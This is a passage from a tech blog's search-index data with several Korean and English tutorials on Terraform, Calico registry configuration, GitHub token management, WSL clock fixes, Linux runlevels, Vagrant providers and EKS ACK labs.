--auto-approve 옵션을 주지 않으면 apply는\n[ terraform plan -\u0026gt; You say yes -\u0026gt; terraform apply it ]을 진행합니다. yes를 입력하지 않으면, 취소됩니다. YES, Y, y는 처리되지 않습니다. 이 과정에서, 작업하고 있는 PC(특히, CPU) 사양에 따라 소요 시간이 널뛰기하니 참고. 다른 터미널을 켜서, 아래와 같이 관찰 준비를 합니다. 인스턴스 IP가 뜨면 성공. while true; do aws ec2 describe-instances --query \u0026#34;Reservations[*].Instances[*].{PublicIPAdd:PublicIpAddress,InstanceName:Tags[?Key==\u0026#39;Name\u0026#39;]|[0].Value,Status:State.Name}\u0026#34; --filters Name=instance-state-name,Values=running --output text ; echo \u0026#34;------------------------------\u0026#34; ; sleep 1; done (3) terraform destroy 인스턴스가 생성된 것을 확인했으니, 해당 리소스를 삭제합니다. terraform apply와 마찬가지로 yes를 입력해야 삭제가 진행됩니다. 기존에 수동으로 생성했던, 다른 인스턴스나 리소스들은 영향을 받지 않습니다. 아래와 같이 인스턴스가 삭제되는 것을 확인할 수 있습니다. 별첨: backend lock terraform은 충돌을 방지하기 위해, 같은 backend를\n대상으로 다른 곳에서 먼저 작업 중이라면 lock을 기본값으로 갖고있습니다. 로컬 백엔드에서 작업하는 경우도, 터미널 2개 이상에서 시도할 경우 lock이 걸립니다. 마무리 및 느낀점 간단한 예제를 통해, Ubuntu 이미지를 직접 찾아보고 terraform을 알아보았습니다. tfenv는 가이드에서 소스코드를 얕은 클론(swallow clone)으로 진행하는데 반해,\nterraform는 공식 GitHub에 있는 commit history를 다 가져오도록 함.\n명령어를 $PATH에 등록할 때도 접근법이 다름. Reference CloudNet@ 테라폼으로 시작하는 IaC Terraform CLI Go/gccgo AWS awscli v2 Ubuntu Wiki/Minimal ","date":"2023-08-31T22:21:08+09:00","permalink":"https://blog.minseong.xyz/post/terraform-hello-world-tfenv/","section":"post","tags":["Terraform","CloudNet@","Ubuntu","tfenv"],"title":"Terraform 시작하기 w/Minimal Ubuntu"},{"categories":null,"contents":"Written in 25 July 2023. It could be different when you read this article. Error I met I met error message like Init:ImagePullBackOff when I tried to create calico pod.\nkubectl get pods --all-namespaces NAMESPACE NAME READY STATUS RESTARTS AGE kube-system calico-kube-controllers-xxxxxxxxxx-yyyyy 1/1 Running 1 13h kube-system calico-node-xxxxx 0/1 Init:ImagePullBackOff 0 13h Why it happened Yes, it\u0026rsquo;s because of changed docker hub policy. Recently, I\u0026rsquo;m in an environment that about 20~30 people use 4 public IP addresses. So, it\u0026rsquo;s easy to reach docker hub pull rate limit.\nkubectl describe pod calico-node-xxxxx -n kube-system # Failed to pull image \u0026#34;calico/cni:v3.16.4\u0026#34;: rpc error: code = Unknown desc = Error response from daemon: toomanyrequests: You have reached your pull rate limit. You may increase the limit by authenticating and upgrading: https://www.docker.com/increase-rate-limit How to solve Solve this problem by using quay registry. But, cause this way is not described in Docs, it was little bit hard to find out how to do it.\n# install calico kubectl create -f https://raw.githubusercontent.com/projectcalico/calico/v3.26.1/manifests/tigera-operator.yaml # To change image registry, get manifest file for custom resources wget https://raw.githubusercontent.com/projectcalico/calico/v3.26.1/manifests/custom-resources.yaml # change image registry CALICO_ALTER_REGISTRY=\u0026#34;quay.io/\u0026#34;; sed \u0026#34;0,/spec:/s|spec:|\u0026amp;\\n registry: $CALICO_ALTER_REGISTRY|\u0026#34; custom-resources.yaml # apply manifest file kubectl apply -f custom-resources.yaml etc My colleague advised me to see Docs below,\nbut It seems like taking some time.\nk8s - Pull an Image from a Private Registry Reference Github - Can not pull docker.io/calico/cni:v3.20.0 Github - Use quay.io as default to mitigate dockerhub rate limit errors Github - Switch the calico images to be pulled from quay.io ","date":"2023-07-25T00:40:14+09:00","permalink":"https://blog.minseong.xyz/post/init-calico-from-quay-registry/","section":"post","tags":["calico","k8s"],"title":"Init Calico from quay registry"},{"categories":null,"contents":"평소에는 Git관리를 terminal을 통해서 하고,\n여러 SSH키를 통해 작업을 하기에\n.ssh/config를 통해 키 기반으로 관리하고 있었다.\n어쩌다보니, 토큰 기반으로 그것도 윈도우에서 관리를 해보게 되어서 둘 다 생소한 접근이라 새로운 셋업을 적용해보기로 했다.\nVSCode 기반으로 세팅하기에, 그대로 따라온다면 별 문제 없이 잘 적용될 것이다.\ncf. classic token이라 할지라도, 큰 이슈는 없을 것으로 생각된다.\nGit config의 적용범위 git config \u0026lt;parameter\u0026gt;를 통해, 설정 값을 구성할 수 있다. system \u0026gt; global \u0026gt; local 순으로 옵션이 override된다.\n\u0026ndash;system: 시스템 전체에 적용 \u0026ndash;global: 사용자 전체에 적용 \u0026ndash;local: 해당 저장소에만 적용 먼저 이걸 말한 이유는, Github의 repo별로 토큰을 개별 관리하기 위해서 global 옵션에서 셋업을 하여야 하기에, 이해가 선행되어야한다.\n장점: Repo별로 Token을 관리하기 때문에, 권한 관리에 용이 단점: 같은 토큰을 사용하는 Repo가 많아지만 중복 발생 물론 Docs(Git홈페이지, man-page)를 참고하면 가장 큰 도움이 될 것이다.\nRepository별 토큰 관리 본 포스트에서는 Repo별로 토큰을 관리하기 위해, Fine-grained access control을 사용하여 토큰 2개를 발급 받는다. Beta 기능이기에 작성 시점의 내용과 실제로 적용되는 내용이 다를 수 있다. Github Token 생성 이건 누구나 다 아는 내용이니 가볍게 후술하면,\n(Profile) Settings \u0026gt; Developer Settings \u0026gt; Personal Access Token 에서 Fine-grained access control을 통해, 토큰을 생성한다.\nOnly select repositories : 적용할 repo 선택 Repository Permission : Private 또는 특정 repo 선택 시 활성화 Contents : 기본적인 repo 컨텐츠 제어 (RO|RW) (Metadata) : Permission이 하나라도 지정되면, 자동 활성(필수)\nAWS에서 Instance Name 기입하면 Tag 자동생성되는 것을 생각하자. 이 외의 옵션은, 필요에 따라 선택하면 된다.\nWindows에서 git-credential config 관리 기본적으로, Windows에서 credential은 자격 증명 관리자에서 관리가 된다.\n따라해보다가 안되면, 여기에서 원인이 되는 해당 자격증명을 삭제하면 된다.\n단, 따로 보관을 했거나, 알고 있는 경우에만 삭제하는 것을 권유 (선택)원활한 시연을 위해 기존의 관련 설정을 지우고(수정) 적용한다.\n먼저 시도하지 말고, 그 다음의 설정값을 확인, 참조하여 적용하자. # 에디터에서 수정 git config --system --edit git config --global --edit # CLI에서 수정 git config --system --unset credential.helper git config --global --unset credential.helper 0. git-credential-manager(GCM) 설치 및 기본 에디터 셋업 Git 홈페이지에서 exe파일을 다운로드 받아 기본 설정으로 설치를 했다면, 기본값으로 설치되어 있을 것이다.\n다음 단계에서 제대로 명령어가 구동이 되지 않는다면, standalone으로 설치할 수 있다. 간혹 GNU nano로 설정값 에디터가 설정되어 있기에,\n익숙한 에디터가 있다면 별도로 설정하도록 하자.\n# 택1. VSCode git config --global core.editor \u0026#34;code -w\u0026#34; # 택2. vi(vim) git config --global core.editor \u0026#34;vi\u0026#34; 1. git-credential-manager(GCM) config 설정 크게 두 가지를 설정한다.\ncredential(token 등)저장 옵션 repo 별 credential 관리 옵션 1-1. credential 저장 옵션 기본값(NULL): 아무것도 저장하지 않는다. cache: 메모리에 저장. 통상 15분 유효, 디스크 저장 X. store: 파일에 저장. 기본경로 ~/.git-credentials 개인적으로 경로가 혼동되기 때문에 직접 경로 지정을 사용. # 택1) store in `~/.git-credentials` git config --global credential.helper \u0026#39;store --file ~/.git-credentials\u0026#39; # 택2) cache 1 hr git config --global credential.helper \u0026#39;cache --timeout 3600\u0026#39; # 해제 # git config --global --unset credential.helper 1-2. repo 별 credential 관리 옵션 위의 설정까지만 하면, repo간 다른 토큰을 쓰면 마지막에 입력한 토큰으로 계속 override된다. 규칙을 적용하여 repo별로 토큰 관리 활성화를 한다. (like SSH known_hosts) git config --global credential.useHttpPath true 각 repo에 tokenize 적용 적용을 위해, 미리 local에서 토큰과 repo를 제거하고 다시 clone 작업 Github 기준, dockerhub 이후에 ~/.git-credentials에 토큰이 repo별로 저장되어있는 것을 확인 git clone https://github.com/kkumtree/repo-example \u0026gt; Cloning into \u0026#39;repo-example\u0026#39;... \u0026gt; Username for \u0026#39;https://github.com/kkumtree/repo-example\u0026#39;: kkumtree \u0026gt; Password for \u0026#39;https://kkumtree@github.com/kkumtree/repo-example\u0026#39;:\u0026lt;INSERT TOKEN HERE\u0026gt; \u0026gt; remote: Enumerating objects: 49, done. \u0026gt; remote: Counting objects: 100% (49/49), done. \u0026gt; remote: Compressing objects: 100% (38/38), done. \u0026gt; remote: Total 49 (delta 5), reused 37 (delta 1), pack-reused 0 \u0026gt; Receiving objects: 100% (49/49), 5.63 KiB | 5.63 MiB/s, done. Further More 앞에서 언급한 토큰 중복 이슈를 해결할 수는 있다. 참고: https://git-scm.com/docs/gitcredentials#_avoiding_repetition 위의 설정에서 일부를 바꿔야하나, 아래와 같이 입력할 수 있다 자세한 건, 위의 avoiding repetition 링크 참조 # git config credential.https://example.com.username myusername git config credential.https://github.com.username kkumtree 정리 여러 토큰을 리포지토리 별로 저장하는 방법을 서술하였다. repo에 대한 UAC?(User Access Control)를 토큰 기반으로 하고자 할 때 UAC를 SSH key별로 하려면 다른 전략을 권한다. reference Git - Credential 저장소 The lastest GCM as a standalone service gitcredentials git-credential-store ","date":"2023-07-04T09:57:14+09:00","permalink":"https://blog.minseong.xyz/post/how-to-manage-github-tokens-in-local-windows/","section":"post","tags":["Github","VSCode","Windows","BDIA"],"title":"Windows에서 여러 Github 토큰 관리"},{"categories":null,"contents":"최근 WSL를 쓰게 되면서, 한 가지 이슈가 생겼다.\nAPT repo를 업데이트 하면 아래와 같은 에러가 발생한다.\n이것저것 손대보고 해결법을 적어보고자 한다.\nE: Release file for http://ports.ubuntu.com/ubuntu-ports/dists/jammy/InRelease is not valid yet (invalid for another 5min 1s). Updates for this repository will not be applied. 오류 증상은 릴리스 파일이 존재하지 않는데, 5분 1초동안 유효하지 않는다고 한다.\n무슨 말인가 싶은데, 5분 있다가 업데이트 해보라는 것이다.\n원인 오랫동안 절전모드로 두어서 시간 동기화가 안된 것으로 보인다.\n재부팅하지 않으려고 했기에, 해결을 위해 더 많은 시간을 보냈다.\n해결 방법 1. 시간 동기화 검색엔진에 널려있는 해결법은 시간 동기화이다. 당연하게도 Ubuntu의 시각이 과거에 있기 때문에, 하드웨어 시각을 실제 시간에 맞추면 된다. 물론 시간동기화는 자동으로 이루어지기 때문에 웬만한 경우에는 해결되나,\n사용하고 있던 WSL환경에서는 한 시간이 되어도 해결되지 않았다. 아래의 커맨드를 통해서 강제 동기화를 하였으나 효과가 없었다.\n하지만, 많은 경우 해결이 된다. # 강제로 시간 동기화 # Force system to use local time sudo timedatectl set-local-rtc 1 # APT repo 정상 업데이트 확인 sudo apt-get update -y \u0026amp;\u0026amp; sudo apt-get upgrade -y # 시간 동기화 설정 원복 sudo timedatectl set-local-rtc 0 해결방법 2. 시간 지정 우연히, Youtube 영상(References 추가)을 참고하여 문제를 해결 하였다. 시간을 문자열로 지정하면 된다. 영상에서는 시간을 특정하여 지정하였지만,\n나의 경우에는 일 단위로 차이가 나서 효과가 없었다. 아예 날짜를 특정하여 지정하였다. # 시간 지정 방법(1) sudo date -s \u0026#34;23:59:59\u0026#34; # 시간 지정 방법(2) sudo date +%T -s \u0026#34;20:31:31\u0026#34; # 날짜 지정 방법 sudo date %Y%m%d -s \u0026#34;20230624\u0026#34; # 시간 및 날짜 지정 방법 sudo date -s \u0026#34;2023-06-24 23:59:59\u0026#34; 정상적으로 업데이트 됨을 확인 이후에 장기간 사용하다 보면, 시간동기화를 할 것이기 때문에 큰 상관이 없다. References KailTut-Youtube IT\u0026rsquo;S FOSS ","date":"2023-06-29T02:28:34+09:00","permalink":"https://blog.minseong.xyz/post/how-to-fix-ubuntu-release-file-is-not-valid-yet/","section":"post","tags":["WSL","Ubuntu"],"title":"Release file for URL is not valid yet 해결 방법"},{"categories":null,"contents":"CPU를 1600X에서 5700X로 업그레이드를 진행하기에 앞서,\nRunLevel(런레벨/부트레벨)에 대해 한번 메모하고자 함.\nRunlevel 7가지 레벨이 존재\nman runlevel 참고 Level 5을 제외하고는, cli 환경에서만 구동\nLinux Standard Base 기준\nls -l /lib/systemd/system/runlevel?.target 명령어로 확인 가능 RunLevel EN 설명 비고 0 Power Off 시스템 종료(중단/Halt) 1 Rescue 시스템 복구 단일 사용자 모드 2 Multi-User 다중 사용자(텍스트 모드, 네트워크 서비스 X) 사용 X (사용자 정의 가능) 3 Multi-User 다중 사용자(텍스트 모드) 4 Multi-User 상동 사용 X (사용자 정의 가능) 5 Graphical 다중 사용자 모드 (그래픽 모드) X-window 기반 6 Reboot 시스템 리부팅 운영체제(Ubuntu 22.04 기준)내 확인 su 모드에서. target을 기반으로 링킹되어 있음을 확인 ls -al /lib/systemd/system/runlevel?.target: default ls -al /etc/systemd/system | grep runlevel?.target.wants: 사용자 정의용 폴더 sudo su ls -l /lib/systemd/system/runlevel?.target* 타겟 변경의 경우, 아래 lesstif를 참조 Reference Runlevel LSB - Wikipedia dongle94 lesstif ","date":"2023-06-22T16:07:05+09:00","permalink":"https://blog.minseong.xyz/post/runlevel-in-linux/","section":"post","tags":["Ubuntu","BDIA"],"title":"Linux Runlevel - 런레벨/부트레벨"},{"categories":null,"contents":"Ubuntu 23.04 (Host OS)에서 간단하게 Vagrant 사용을 해보고, VBox가 아닌 Docker를 Provider로 지정하여 사용해본다.\nWSL2 환경에서는 Vagrant가 의도한대로 작동하지 않으므로 유의: 별도의 설정 필요 Hashicorp Docs Vagrant 설치 Ubuntu 22.04 LTS 및 23.10 기준, APT repo를 통한 설치 지원 sudo apt-get install vagrant VBox 설치(사용 시) CPU 가상화 기술 활성화 필요(BIOS단, AMD의 경우는 SVM, Intel의 경우는 VT-x) virtualbox-ext-pack(선택): USB 2.0/3.0 지원 등의 확장 기능을 사용하려면 설치 개인용도의 제한적 라이선스(동의를 위한 대화창 확인) 확장기능을 쓸 필요가 없기 때문에 설치하지 아니함 sudo apt-get install virtualbox # sudo apt-get install virtualbox-ext-pack Docker 설치(사용 시) Ubuntu 기준, 아래 3가지 설치 방법이 있으므로, 친숙한 모드로 진행 sudo snap install docker # 최신버전 sudo apt-get install docker.io sudo apt-get install podman-docker Docker 권한 부여: 라이브 서비스 시 권한 유의 (Docker Docs) Docker 그룹에 현재 사용자 추가 Docker 그룹에 속한 사용자는 sudo 없이도 Docker 사용 가능 sudo addgroup --system docker sudo adduser $USER docker newgrp docker (참고) Docker 공식 Docs에 서술된 Docker Engine 설치 방법 Docker Docs: Install Docker Engine on Ubuntu Vagrantfile 생성 VBox 사용 시 Snippet: Gist CPU: 1Core / RAM: 1024MB # -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;ubuntu/focal64\u0026#34; config.vm.define \u0026#34;ubuntu\u0026#34; do |ubuntu| ubuntu.vm.hostname = \u0026#34;kkumtree-server\u0026#34; ubuntu.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.name = \u0026#34;ubuntu-server\u0026#34; vb.cpus = 1 vb.memory = 1024 end ubuntu.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.56.99\u0026#34; ubuntu.vm.provision \u0026#34;shell\u0026#34;, inline: \u0026lt;\u0026lt;-SCRIPT sudo sed -i \u0026#39;s/PasswordAuthentication no/PasswordAuthentication yes/g\u0026#39; /etc/ssh/sshd_config sudo useradd kkumtree -m -s /bin/bash sudo usermod -a -G sudo kkumtree echo kkumtree:kkumtree | sudo chpasswd sudo systemctl restart sshd SCRIPT end end Docker 사용 시 Vagrantfile과 Dockerfile은 같은 폴더에 있음을 전제, 아닐 경우 d.build_dir 파라미터 수정. 아래처럼 다른 폴더를 지정하여 사용 가능 Snippet:\nGist-Vagrantfile Gist-Dockerfile Vagrant PUB key 사용: Github\nVagrant에서 키를 인지하고, 키 교체 작업 진행 Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.define \u0026#34;ubuntu\u0026#34; do |ubuntu| ubuntu.vm.provider \u0026#34;docker\u0026#34; do |d| d.build_dir = \u0026#34;.\u0026#34; end # ubuntu.vm.provision \u0026#34;shell\u0026#34;, inline: \u0026lt;\u0026lt;-SCRIPT # sudo sed -i \u0026#39;s/PasswordAuthentication no/PasswordAuthentication yes/g\u0026#39; /etc/ssh/sshd_config # sudo useradd kkumtree -m -s /bin/bash # sudo usermod -a -G sudo kkumtree # echo kkumtree:kkumtree | sudo chpasswd # sudo systemctl restart sshd # SCRIPT end config.vm.synced_folder \u0026#34;.\u0026#34;, \u0026#34;/vagrant\u0026#34;, disabled: true end FROM public.ecr.aws/ubuntu/ubuntu:20.04_stable RUN apt-get update -y RUN apt-get install -y --no-install-recommends ssh sudo RUN useradd --create-home -s /bin/bash vagrant RUN echo -n \u0026#39;vagrant:vagrant\u0026#39; | chpasswd RUN echo \u0026#39;vagrant ALL = NOPASSWD: ALL\u0026#39; \u0026gt; /etc/sudoers.d/vagrant RUN chmod 440 /etc/sudoers.d/vagrant RUN mkdir -p /home/vagrant/.ssh RUN chmod 700 /home/vagrant/.ssh RUN echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA6NF8iallvQVp22WDkTkyrtvp9eWW6A8YVr+kz4TjGYe7gHzIw+niNltGEFHzD8+v1I2YJ6oXevct1YeS0o9HZyN1Q9qgCgzUFtdOKLv6IedplqoPkcmF0aYet2PkEDo3MlTBckFXPITAMzF8dJSIFo9D8HfdOV0IAdx4O7PtixWKn5y2hMNG0zQPyUecp4pzC6kivAIhyfHilFR61RGL+GPXQ2MWZWFYbAGjyiYJnAmCP3NOTd0jMZEnDkbUvxhMmBYSdETk1rRgm+R4LOzFUGaHqHDLKLX+FIPKcF96hrucXzcWyLbIbEgE98OHlnVYCzRdK8jlqm8tehUc9c9WhQ==\u0026#34; \u0026gt; /home/vagrant/.ssh/authorized_keys RUN chmod 600 /home/vagrant/.ssh/authorized_keys RUN chown -R vagrant:vagrant /home/vagrant/.ssh RUN sed -i -e \u0026#39;s/Defaults.*requiretty/#\u0026amp;/\u0026#39; /etc/sudoers RUN sed -i -e \u0026#39;s/\\(UsePAM \\)yes/\\1 no/\u0026#39; /etc/ssh/sshd_config RUN mkdir /var/run/sshd RUN apt-get -y install openssh-client EXPOSE 22 CMD [\u0026#34;/usr/sbin/sshd\u0026#34;, \u0026#34;-D\u0026#34;] Vagrant 실행 VBox 사용 시, private_network 값이 라우터 등에서 설정한 서브넷마스크와 충돌할 수 있음 기존 VBox Destroy 이후, 서브넷마스크에 맞게 IP 재 지정 후 실행. Provider 지정 실행 (Default) Win: VBox, Linux: Libvirt Docker의 경우는 provider 지정하여 실행하거나, 따로 기본값으로 설정해두어야함. # VBox 사용시 vagrant up # Docker 사용시 vagrant up --provider=docker Vagrant 접속 SSH 접속 # Docker) vagrant 지원 명령어 사용 vagrant ssh # VBox) ssh 명령어 사용 ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kkumtree@localhost Reference phoenixNAP HashiCorp DEV-mattdark ","date":"2023-06-19T11:12:47+09:00","permalink":"https://blog.minseong.xyz/post/vagrant-init-setup-with-docker/","section":"post","tags":["Vagrant","BDIA"],"title":"Vagrant 설치 및 Provider 지정"},{"categories":null,"contents":"EKS 스터디도 마지막 7주차를 맞이했습니다.\n이번에는 AWS Controller for k8s(ACK)와 flux를 가볍게 실습해보고\n자동화에 대해 맛보기를 해보았습니다.\n앞서 학습해본 IRSA 개념 외에도 CRD(CustomResourceDefinition)을 활용합니다.\n1. 실습환경 배포 실습을 위한 YAML파일이 변경된거 말고는 6주차와 유사합니다.\ncurl -O https://s3.ap-northeast-2.amazonaws.com/cloudformation.cloudneta.net/K8S/eks-oneclick6.yaml # 이하 중략 # CERT_ARN(ACM)의 경우에는 /etc/profile에 환경변수 저장을 안해둬서 # 세션이 만료되면, 다시 재설정 필요 CERT_ARN=`aws acm list-certificates --query \u0026#39;CertificateSummaryList[].CertificateArn[]\u0026#39; --output text` echo $CERT_ARN 2. ACK(AWS Controller for k8s) 웹콘솔에 접근하지 않고도, AWS 서비스 리소스를 직접 k8s에서 정의 및 사용가능 순서: ACK 컨트롤러 설치 -\u0026gt; IRSA 설정 -\u0026gt; AWS 리소스 컨트롤 같은 패턴으로 이루어져있는데, Cloudformation을 쓰다보니 중간중간 대기 시간 발생 (23/05/29) GA: 17개 서비스, Preview: 10개 서비스 2-1. S3 [ACK S3 Controller 설치] # 서비스명 변수 지정 export SERVICE=s3 # helm 차트 다운로드 export RELEASE_VERSION=$(curl -sL https://api.github.com/repos/aws-controllers-k8s/$SERVICE-controller/releases/latest | grep \u0026#39;\u0026#34;tag_name\u0026#34;:\u0026#39; | cut -d\u0026#39;\u0026#34;\u0026#39; -f4 | cut -c 2-) helm pull oci://public.ecr.aws/aws-controllers-k8s/$SERVICE-chart --version=$RELEASE_VERSION tar xzvf $SERVICE-chart-$RELEASE_VERSION.tgz # helm chart 확인 tree ~/$SERVICE-chart # ACK S3 Controller 설치 export ACK_SYSTEM_NAMESPACE=ack-system export AWS_REGION=ap-northeast-2 helm install --create-namespace -n $ACK_SYSTEM_NAMESPACE ack-$SERVICE-controller --set aws.region=\u0026#34;$AWS_REGION\u0026#34; ~/$SERVICE-chart # 설치 확인 helm list --namespace $ACK_SYSTEM_NAMESPACE kubectl -n ack-system get pods kubectl get crd | grep $SERVICE kubectl get all -n ack-system kubectl get-all -n ack-system kubectl describe sa -n ack-system ack-s3-controller [IRSA 설정] AmazonS3FullAccess 설정 후에는 rollout으로 반영해주어야함 # Create an iamserviceaccount - AWS IAM role bound to a Kubernetes service account eksctl create iamserviceaccount \\ --name ack-$SERVICE-controller \\ --namespace ack-system \\ --cluster $CLUSTER_NAME \\ --attach-policy-arn $(aws iam list-policies --query \u0026#39;Policies[?PolicyName==`AmazonS3FullAccess`].Arn\u0026#39; --output text) \\ --override-existing-serviceaccounts --approve # 확인 eksctl get iamserviceaccount --cluster $CLUSTER_NAME kubectl get sa -n ack-system kubectl describe sa ack-$SERVICE-controller -n ack-system # Restart ACK service controller deployment using the following commands. kubectl -n ack-system rollout restart deploy ack-$SERVICE-controller-$SERVICE-chart # IRSA 적용으로 Env, projected Volume 추가 확인 kubectl describe pod -n ack-system -l k8s-app=$SERVICE-chart [리소스 조작] S3 버킷 생성, 업데이트, 삭제 새로운 쉘로 모니터링 준비: watch -d aws s3 ls S3 버킷네임은 전세계에서 고유해야하므로 각자 본인이 쓰고 있는 계정명으로 명명 # S3 버킷 생성을 위한 설정 파일 생성 export AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \u0026#34;Account\u0026#34; --output text) export BUCKET_NAME=my-ack-s3-bucket-$AWS_ACCOUNT_ID read -r -d \u0026#39;\u0026#39; BUCKET_MANIFEST \u0026lt;\u0026lt;EOF apiVersion: s3.services.k8s.aws/v1alpha1 kind: Bucket metadata: name: $BUCKET_NAME spec: name: $BUCKET_NAME EOF echo \u0026#34;${BUCKET_MANIFEST}\u0026#34; \u0026gt; bucket.yaml cat bucket.yaml | yh # S3 버킷 생성 aws s3 ls kubectl create -f bucket.yaml # S3 버킷 확인 aws s3 ls kubectl get buckets kubectl describe bucket/$BUCKET_NAME | head -6 aws s3 ls | grep $BUCKET_NAME # S3 버킷 업데이트: 태그 정보 입력 read -r -d \u0026#39;\u0026#39; BUCKET_MANIFEST \u0026lt;\u0026lt;EOF apiVersion: s3.services.k8s.aws/v1alpha1 kind: Bucket metadata: name: $BUCKET_NAME spec: name: $BUCKET_NAME tagging: tagSet: - key: myTagKey value: myTagValue EOF echo \u0026#34;${BUCKET_MANIFEST}\u0026#34; \u0026gt; bucket.yaml # S3 버킷 설정 업데이트 실행 : 필요 주석 자동 업뎃 내용이니 무시해도됨! kubectl apply -f bucket.yaml # S3 버킷 업데이트 확인 kubectl describe bucket/$BUCKET_NAME | grep Spec: -A5 # S3 버킷 삭제 kubectl delete -f bucket.yaml kubectl get bucket/$BUCKET_NAME aws s3 ls | grep $BUCKET_NAME [ACK S3 Controller 삭제] helm -\u0026gt; CRD -\u0026gt; IRSA # helm uninstall export SERVICE=s3 helm uninstall -n $ACK_SYSTEM_NAMESPACE ack-$SERVICE-controller # ACK S3 Controller 관련 crd 삭제 kubectl delete -f ~/$SERVICE-chart/crds # IRSA 삭제 eksctl delete iamserviceaccount --cluster myeks --name ack-$SERVICE-controller --namespace ack-system 2-2. EC2 \u0026amp; VPC 반복숙달의 반복.\nS3(2-1)를 건너뛰었다면, helm 설치 시 --create-namespace 추가 [ACK EC2-Controller 설치]\nEC2 외에도, 해당 인스턴스를 위한 구성요소들을 위한 CRD도 포함된다. # 서비스명 변수 지정 및 helm 차트 다운로드 export SERVICE=ec2 export RELEASE_VERSION=$(curl -sL https://api.github.com/repos/aws-controllers-k8s/$SERVICE-controller/releases/latest | grep \u0026#39;\u0026#34;tag_name\u0026#34;:\u0026#39; | cut -d\u0026#39;\u0026#34;\u0026#39; -f4 | cut -c 2-) helm pull oci://public.ecr.aws/aws-controllers-k8s/$SERVICE-chart --version=$RELEASE_VERSION tar xzvf $SERVICE-chart-$RELEASE_VERSION.tgz # helm chart 확인 tree ~/$SERVICE-chart # ACK EC2-Controller 설치 export ACK_SYSTEM_NAMESPACE=ack-system export AWS_REGION=ap-northeast-2 helm install -n $ACK_SYSTEM_NAMESPACE ack-$SERVICE-controller --set aws.region=\u0026#34;$AWS_REGION\u0026#34; ~/$SERVICE-chart # 설치 확인 helm list --namespace $ACK_SYSTEM_NAMESPACE kubectl -n $ACK_SYSTEM_NAMESPACE get pods -l \u0026#34;app.kubernetes.io/instance=ack-$SERVICE-controller\u0026#34; kubectl get crd | grep $SERVICE [IRSA 설정] AmazonEC2FullAccess eksctl create iamserviceaccount \\ --name ack-$SERVICE-controller \\ --namespace $ACK_SYSTEM_NAMESPACE \\ --cluster $CLUSTER_NAME \\ --attach-policy-arn $(aws iam list-policies --query \u0026#39;Policies[?PolicyName==`AmazonEC2FullAccess`].Arn\u0026#39; --output text) \\ --override-existing-serviceaccounts --approve eksctl get iamserviceaccount --cluster $CLUSTER_NAME kubectl get sa -n $ACK_SYSTEM_NAMESPACE kubectl describe sa ack-$SERVICE-controller -n $ACK_SYSTEM_NAMESPACE kubectl -n $ACK_SYSTEM_NAMESPACE rollout restart deploy ack-$SERVICE-controller-$SERVICE-chart # IRSA 적용으로 Env, projected Volume 추가 확인 kubectl describe pod -n $ACK_SYSTEM_NAMESPACE -l k8s-app=$SERVICE-chart [리소스 조작] VPC, Subnet 생성 및 삭제 새로운 쉘로 모니터링 준비: while true; do aws ec2 describe-vpcs --query 'Vpcs[*].{VPCId:VpcId, CidrBlock:CidrBlock}' --output text; echo \u0026quot;-----\u0026quot;; sleep 1; done # VPC 생성 cat \u0026lt;\u0026lt;EOF \u0026gt; vpc.yaml apiVersion: ec2.services.k8s.aws/v1alpha1 kind: VPC metadata: name: vpc-tutorial-test spec: cidrBlocks: - 10.0.0.0/16 enableDNSSupport: true enableDNSHostnames: true EOF kubectl apply -f vpc.yaml # VPC 생성 확인 kubectl get vpcs kubectl describe vpcs aws ec2 describe-vpcs --query \u0026#39;Vpcs[*].{VPCId:VpcId, CidrBlock:CidrBlock}\u0026#39; --output text # 다른 새로운 쉘이나 기존 모니터링 쉘 변경하여 모니터링 준비 VPCID=$(kubectl get vpcs vpc-tutorial-test -o jsonpath={.status.vpcID}) while true; do aws ec2 describe-subnets --filters \u0026#34;Name=vpc-id,Values=$VPCID\u0026#34; --query \u0026#39;Subnets[*].{SubnetId:SubnetId, CidrBlock:CidrBlock}\u0026#39; --output text; echo \u0026#34;-----\u0026#34;; sleep 1 ; done # 서브넷 생성 VPCID=$(kubectl get vpcs vpc-tutorial-test -o jsonpath={.status.vpcID}) cat \u0026lt;\u0026lt;EOF \u0026gt; subnet.yaml apiVersion: ec2.services.k8s.aws/v1alpha1 kind: Subnet metadata: name: subnet-tutorial-test spec: cidrBlock: 10.0.0.0/20 vpcID: $VPCID EOF kubectl apply -f subnet.yaml # 서브넷 생성 확인 kubectl get subnets kubectl describe subnets aws ec2 describe-subnets --filters \u0026#34;Name=vpc-id,Values=$VPCID\u0026#34; --query \u0026#39;Subnets[*].{SubnetId:SubnetId, CidrBlock:CidrBlock}\u0026#39; --output text # 리소스 삭제: 서브넷, VPC kubectl delete -f subnet.yaml \u0026amp;\u0026amp; kubectl delete -f vpc.yaml 2-4. VPC Workflow 실습 2-3의 ACK 및 IRSA는 그대로 활용\nVPC, Subnet, SG, RT, EIP, IGW, NATGW, Instance 생성\nclient \u0026lt;-\u0026gt; public subnet(ssh tunneling) \u0026lt;-\u0026gt; private subnet 접속\nACK로 위의 환경을 만들 수 있는지 실습하는 작업\n[VPC 환경설정]\n모니터링 준비: watch -d kubectl get routetables,subnet NATGW 생성 완료 후, 아래 요소들이 순차적으로 확인됨 (약 5분 소요) tutorial-private-route-table-az1: 라우팅 테이블 ID tutorial-private-subnet1: 서브넷 ID cat \u0026lt;\u0026lt;EOF \u0026gt; vpc-workflow.yaml apiVersion: ec2.services.k8s.aws/v1alpha1 kind: VPC metadata: name: tutorial-vpc spec: cidrBlocks: - 10.0.0.0/16 enableDNSSupport: true enableDNSHostnames: true tags: - key: name value: vpc-tutorial --- apiVersion: ec2.services.k8s.aws/v1alpha1 kind: InternetGateway metadata: name: tutorial-igw spec: vpcRef: from: name: tutorial-vpc --- apiVersion: ec2.services.k8s.aws/v1alpha1 kind: NATGateway metadata: name: tutorial-natgateway1 spec: subnetRef: from: name: tutorial-public-subnet1 allocationRef: from: name: tutorial-eip1 --- apiVersion: ec2.services.k8s.aws/v1alpha1 kind: ElasticIPAddress metadata: name: tutorial-eip1 spec: tags: - key: name 